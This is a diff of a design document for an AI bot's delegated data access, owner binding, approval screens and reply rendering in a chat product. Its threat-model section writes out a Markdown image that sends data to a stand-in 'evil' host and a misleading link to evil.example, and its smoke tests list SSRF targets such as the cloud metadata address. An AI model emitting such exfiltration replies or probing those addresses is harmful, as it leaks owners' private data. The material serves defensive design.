@@ -83,12 +83,29 @@ gateway holds no OAuth token, refresh token or delegation: it holds a service cr
   session, never a request body), the expiry is within the ceiling, and nothing is granted beyond the permitted read
   permissions. It posts the delegation to `/native/grant` with the service credential, and the MCP derives the owner
   from the signed grant itself.
-- **Calls.** The gateway sends the service credential and the owner DID the supervisor registered for that bot
-  (`PUT /bots/<botId>` carries only the token today and gains the owner DID). It never uses anything the sandbox sends:
-  the identity comes from the socket, not from the model. The credential is a gateway secret in its environment, like
-  the model key; the sandbox, the supervisor's saved state and the bot state never hold it. There is no code exchange,
-  `state`, refresh token or token file in this path, so the login-CSRF and mix-up risks of an OAuth exchange do not
-  arise; what stands in their place is the backend's check that the delegator is the signed-in user.
+- **Which screen signs, and the cross-app rule.** TinyChat's own session holds only TinyChat's own prefix. Main's
+  history grant works because it first checks `hasPermissions` for that prefix: `delegateTo` would otherwise try a
+  runtime permission escalation (`frontend/src/bots/historyGrant.ts`, in its own comment). Main reading another app's
+  data is cross-app and beyond what the session holds, so the owner must first approve extra authority at OpenKey's
+  approval screen (the escalation prompt, in the popup or embedded flow); TinyChat then signs the narrowed delegation
+  to Main's service DID. **This is a requirement, not a copy claim: that screen shows the cross-app warning with
+  "Reject this permission", and no cross-app grant is offered until it does.** Until then the picker offers only
+  TinyChat's own prefix, where no OpenKey screen appears. The `/delegate` link flows are not that screen (they show
+  neither). Which OpenKey flow shows it, and how TinyChat's session obtains the extra authority, are OpenKey's to
+  confirm (decision 1).
+- **Calls and the owner binding.** The gateway sends the service credential and an owner DID. The backend derives the
+  DID from the authenticated session address (`botOwnerDid` in `backend/src/routes/bots.ts`; the request body and
+  headers never choose it) and sends it to the supervisor with the service secret, and the supervisor keys the bot by
+  `botIdFor(ownerDid)`, the hash of the DID. Registration (`PUT /bots/<botId>` carries only the token today) gains that
+  DID, and: the gateway refuses a registration whose DID does not hash to the bot id; the DID is fixed for as long as
+  the bot is registered, and a different DID for a registered bot is an error, not an update; the sandbox and the chat
+  can never supply or change it, and any identity header the sandbox sends is dropped. The MCP trusts the DID the
+  gateway sends, so this mapping is the isolation between owners. One bot per owner exists today (the bot id is a
+  function of the DID alone), so one grant per owner covers it; if an owner ever has several bots, a grant carries the
+  bot id or each bot gets its own service identity, never a silent share. The credential is a gateway secret in its
+  environment, like the model key; the sandbox, the supervisor's saved state and the bot state never hold it. There is
+  no code exchange, `state`, refresh token or token file in this path, so the login-CSRF and mix-up risks of an OAuth
+  exchange do not arise; what stands in their place is the backend's check that the delegator is the signed-in user.
 - **Windows.** The expiry is signed into the delegation, so the node refuses it afterwards. "Just for this task" is a
   delegation that expires in 1 hour at most, and the gateway also stops using it when Main's turn settles. "For 7
   days" is a 7-day delegation, offered only after a warning screen, with no silent renewal: a renewal is a new
@@ -96,6 +113,15 @@ gateway holds no OAuth token, refresh token or delegation: it holds a service cr
 - **Revoke.** There is no route to revoke a native grant. Disconnect ends Main's use of it (the gateway marks the bot's
   grant ended and refuses before calling the MCP); the delegation itself ends at its signed expiry. That is why the
   windows are short, and the copy says when it ends.
+- **Risks, stated plainly.**
+  - *A stolen gateway credential* reads every live Main grant of every owner registered on that gateway, until each
+    ends (up to 7 days), because a native grant cannot be withdrawn early. Rotating the credential at the MCP should
+    cut the thief off at once (confirm at build); the grants themselves stay until they expire. That is why Main gets
+    its own service identity and credential (precondition 2), why the default window is 1 hour, and why "For 7 days"
+    sits behind a warning.
+  - *"For 7 days" does not renew.* This plan makes it a 7-day delegation that ends, and a renewal is a new owner
+    signature. That is stricter than the earlier rule of "7 days, renewing, behind a warning", and it costs the owner
+    a re-sign each week. Which one ships is a product decision (decision 3).
 
 **Precondition (decision 2): the MCP does not do this for Main yet, and nothing below ships until it does.**
 1. *Shape and tools.* The MCP accepts exactly the connectors permissions and exposes two tools to a native identity.
@@ -158,7 +184,7 @@ ends. A shorter signed expiry is the only early end.
 | Main's settings, off | "TinyCloud data" / "Main can't read your TinyCloud data." / button "Let Main read it" |
 | Choice sheet | **Held until decision 2 is built** (the windows are not yet true): "Let Main read your TinyCloud data?" / "Main can read what you pick, nothing else. It can't change anything. What it reads is sent to the AI model service to write its answer." / options "Just for this task" (selected), "For 7 days" / "You pick what Main can read" (app list, none selected) |
 | After "For 7 days" | **Held until decision 2 is built:** warning screen: "Keep Main's access for 7 days?" / "Main will keep reading what you picked until you turn it off or 7 days pass. It will not renew on its own." / "Keep it to this task" / "Allow 7 days" |
-| Approval | The owner's signing step in the browser (the step Main's history grant uses). No claim about an extra warning or "Reject this permission" |
+| Approval | For the extra authority a cross-app grant needs: OpenKey's approval screen, which **must** show the cross-app warning with "Reject this permission" (held until it exists; no cross-app grant is offered before). For TinyChat's own prefix: the signing step in the browser, with no OpenKey screen |
 | Active | **Held until decision 2 is built:** "Main can read <apps> until <time>." / "Used 12 times today." / button "Disconnect". After Disconnect: "Main has stopped. The permission itself ends <time>." |
 | Ended | "Main's access to your TinyCloud data has ended." / "Give Main access again" |
 
@@ -268,18 +294,33 @@ instructions, and the design does not rely on the model to tell the difference:
   owner has not marked read-only, or anything that sends data to a third party needs the owner's approval outside the
   model, every time, and is never auto-approved. (Writes are not exposed in phase 1.)
 - **Replies are an exfil channel too, and no egress layer sees them.** A reply that contains `![](https://evil/?d=<data>)`
-  leaks the data the moment a renderer loads the image, with no click. Main's reply is plain text today
-  (`frontend/src/bots/MainChat.tsx` renders it in a `<p>` with `whitespace-pre-wrap`: no Markdown, no images, no links),
-  so the path is closed now and opens when replies move to Markdown. The general chat's renderer
-  (`components/assistant-ui/markdown-text.tsx`, `remark-gfm`, no image override) would load such an image. The rule:
-  1. Text the model wrote is never rendered with remote images, on any surface (chat, a card, a notification, a share):
-     the renderer drops the image and shows its alt text and address as plain text. Nothing the model wrote loads on
-     its own.
-  2. A link in model text is plain text until the owner taps it; the destination host is shown, bare addresses are not
-     auto-linked, and while the conversation is marked a tap goes through an "Open <host>?" step.
+  leaks the data the moment a renderer loads the image, with no click. What TinyChat's renderers do today (read, not
+  run):
+  - *Main* (`frontend/src/bots/MainChat.tsx`): a reply is shown as plain text in a `<p>` with `whitespace-pre-wrap`.
+    No Markdown, no images, no links, no auto-linking. Closed now.
+  - *The general chat* (`chat/Thread.tsx`, through `components/assistant-ui/markdown-text.tsx`): `MarkdownTextPrimitive`
+    with `remark-gfm`, overriding only code blocks. A Markdown image renders as an `<img>` and loads from any host as
+    the reply streams in; GFM turns bare URLs into links and renders `[label](https://host)` with a label that can say
+    anything. The desktop app's CSP allows `img-src https:` (`desktop/src-tauri/tauri.conf.json`, noted there as "chat
+    markdown and avatars"), so it would not stop this, and no CSP for the web build was found in this repo. That chat
+    already reads meeting transcripts and does web search, so **this path is open today in the existing chat, not only
+    a future Main risk**, and it needs its own ticket rather than waiting for phase 2.
+  - *Feed posts* render agent-authored media (`PostPage.tsx` `media.src`, option and page images; avatars in
+    `FeedView.tsx`) as remote images by design; article text is plain. That is an agent-to-feed channel, not model
+    prose, and outside this plan, but an agent that can read owner data and also post is the same shape of channel.
+
+  The rule:
+  1. Text a model wrote is never rendered with remote images, on any surface (chat, a card, a notification, a share).
+     In the Markdown renderer that means an `img` override that renders the alt text and the host as plain text and
+     never sets `src`. Nothing the model wrote loads on its own.
+  2. Links in model text are shown as plain text with the full host, never the label alone (`[docs](https://evil.example)`
+     shows as "docs (evil.example)"). Bare addresses are not auto-linked. The owner opens one by tapping it, through an
+     "Open <host>?" step while the conversation is marked, with `rel="noopener noreferrer"`.
   3. A second layer that does not trust the first: while marked, the layer that sees the final reply text strips
      Markdown image syntax and HTML tags from it.
-  This ships no later than phase 2, and is a frontend change that belongs to the surface that renders the reply.
+
+  Rules 1 and 2 ship for the general chat on their own schedule, and for Main no later than phase 2 (or before Main's
+  replies move to Markdown, whichever is first).
 
 ## Owner-added MCP servers (phase 3)
 
@@ -596,19 +637,36 @@ flag and does not change the others.
 
 ## Decisions for the owner of each system (named, not designed here)
 
-1. **OpenKey** (its owner decides): the native path does not depend on it. It matters for the OAuth fallback and for any
-   later approval screen: how a bot requester appears, the 1-hour one-off as the default and a renewing choice behind
-   a warning, and a "Reject this permission" control. The `/delegate` link flows show no extra warning today (the #538
-   security review confirmed that ticket and link flows skip both the warning and the share rule). The owner copy makes
-   no claim about either until it exists.
-2. **Hosted MCP** (js-sdk `packages/mcp`). **A build precondition, not an option.** For Main, its own service DID,
-   credential and tenant namespace; a grant ceiling the owner picks (spaces, prefixes, databases, read only) with the
-   read tools in section 3 for that identity; and a replace rule so a shorter grant can follow a longer one. Without
-   them Main would collide with the transcript grant and the gateway's credential would reach every owner who granted
-   the backend (section 2). Production delegations are 30 days at most and a native grant has no revoke route, so the
-   signed expiry is the only early end.
-3. **What "one task" means.** This plan ends the grant's use when Main's turn settles. If a follow-up message should
-   reuse it, say so before build.
+1. **OpenKey** (its owner decides). **Required for any cross-app read, on either route.** The screen that approves the
+   extra authority a cross-app grant needs shows the cross-app warning with a "Reject this permission" control. The
+   doc's reading is that this is the escalation prompt in OpenKey's popup or embedded approval (the screens the #538
+   draft covers); OpenKey confirms which flow. The `/delegate` link flows show neither today (the #538 security review
+   confirmed that ticket and link flows skip both the warning and the share rule), so they are not an acceptable
+   screen for it. Also open: how TinyChat's session obtains the extra authority before it can delegate, how a bot
+   requester appears, and the 1-hour one-off as the default with the 7-day choice behind a warning. Until it exists
+   Main offers only TinyChat's own prefix, and the owner copy claims nothing about it.
+2. **Step 1 route: how the gateway reaches the owner's TinyCloud data.** **A build precondition, not an option**: both
+   routes need hosted-MCP work before Main can use either. Recommended: **B**.
+
+   | | **A. OpenKey OAuth token in the gateway** | **B. The native-grant pattern the backend uses for transcripts** |
+   | --- | --- | --- |
+   | What the gateway holds | An access token and a refresh token | A service credential; no owner token |
+   | Owner identity | The token's subject, checked after the code exchange | The owner DID the backend derives from the session and the supervisor registers for the bot (fixed per registration, and it must hash to the bot id); the gateway sends it; the grant itself names the owner |
+   | Tenant separation (B1) | **Blocked.** Tenants are keyed by the OpenKey subject alone, so Main would share delegations with the owner's other MCP clients | Avoids it: a native tenant is keyed by owner DID with its own state, apart from the OAuth tenants. It is still one tenant per owner shared with the transcript grant, and one service credential, so Main needs its own (below) |
+   | Windows (1 hour, 7 days) | Token-only: delegations are 30 days and have no revoke (TC-1156) | Real: the owner signs the expiry, and the node refuses it afterwards. A later grant that ends earlier is refused today |
+   | Revoke | Tokens revoke at OpenKey; the delegation stays to its expiry | No revoke route; the signed expiry is the only early end; Disconnect stops Main's use |
+   | Approval | OpenKey's `/delegate` link flows: no extra warning or per-permission reject today | Cross-app: OpenKey's approval screen for the extra authority, which must show the cross-app warning and "Reject this permission". TinyChat's own prefix: the signing step in the browser, as Main's history grant does |
+   | Needs from OpenKey | A new OAuth client, audience and callback for a restricted address; the bot-requester warning and a "Reject this permission" control (decision 1) | The cross-app warning with "Reject this permission" on the escalation screen, and how TinyChat's session obtains the extra authority (decision 1); nothing for TinyChat's own prefix |
+   | Needs from the hosted MCP | A restricted address with its own tenant state (or tenants keyed by subject and client), and a requested-expiry rule | Its own service DID, credential and tenant namespace for bots; a grant ceiling the owner picks (spaces, prefixes, databases, read only) with the read tools in section 3; a replace rule for a shorter grant after a longer one |
+   | Needs from TinyChat | Code exchange, `state` and subject binding, encrypted token storage in the gateway | A backend grant route like the transcript one, the owner DID in bot registration, a signing sheet, the owner copy |
+
+   Recommendation: B. It avoids the shared-tenant problem and makes the windows real. Its OpenKey need (the cross-app
+   warning screen) is one A has too, so B adds none. Its cost is the same kind of hosted-MCP work A needs (a new
+   identity and a wider ceiling), plus a fact to confirm: the native-path facts come from the js-sdk source at an older
+   commit (`ae3b37c4`, 2026-10-29), not the deployed MCP. If that confirmation fails, A is the fallback.
+3. **What "one task" means, and whether "7 days" renews.** This plan ends the grant's use when Main's turn settles. If
+   a follow-up message should reuse it, say so before build. This plan's "For 7 days" does not renew, which is stricter
+   than the earlier "7 days, renewing, behind a warning" rule; say which one ships.
 4. **Search provider.** Recommended default: Tavily, which is already paid for, with no new provider, key or spend once
    confirmed to be the backend's existing key and contract (checked in the code: `TAVILY_API_KEY`, `POST /search`;
    Extract is not used by the backend today, so confirm the plan covers it). Alternatives: Brave Search API, Exa, Kagi,
@@ -626,8 +684,9 @@ flag and does not change the others.
    Smokescreen for owner-added servers (phase 3). iron-proxy is not adopted now. Smokescreen has not been run by us, so
    the spike confirms the choice before phase 3 ships rather than choosing between hops. Whichever, the gateway keeps
    its own checks and the per-owner secrets.
-8. **Reply rendering** (TinyChat frontend): text the model wrote never loads remote images or auto-links, on any
-   surface. See Web access.
+8. **Reply rendering** (TinyChat frontend): text the model wrote never loads remote images, and links show their full
+   host and are never auto-linked, on any surface, including the existing general chat where the image path is open
+   today. See Web access.
 
 ## Smoke check for a later build
 
@@ -640,6 +699,11 @@ On a flagged test account:
   is refused for the backend's grants. A delegation signed for another delegate or by another user is refused by the
   backend (`wrong_delegatee`, `wrong_delegator`), and the node refuses a read outside the signed permissions. `GET` and
   `DELETE` on `/v1/mcp` return 405 and no reply carries `Mcp-Session-Id`.
+- **Owner binding and cross-app:** a registration whose owner DID does not hash to the bot id is refused; a second
+  registration for the same bot with a different DID is refused and the first stays; an owner or identity header sent
+  from the sandbox is ignored; two owners' bots each read only their own grants. A grant for another app's data is
+  offered only after OpenKey's approval screen showed the cross-app warning, and "Reject this permission" removes it;
+  without that screen the picker lists only TinyChat's own prefix.
 - **Web:** a search returns results; a fetch of a public URL returns text; `http://127.0.0.1`,
   `http://169.254.169.254`, a bare IP and a URL with user info are each refused before any call and counted as
   `blocked_url`; a 2 MiB page is cut to 40,000 characters; the 21st fetch in a task is `budget`. With a page that tells
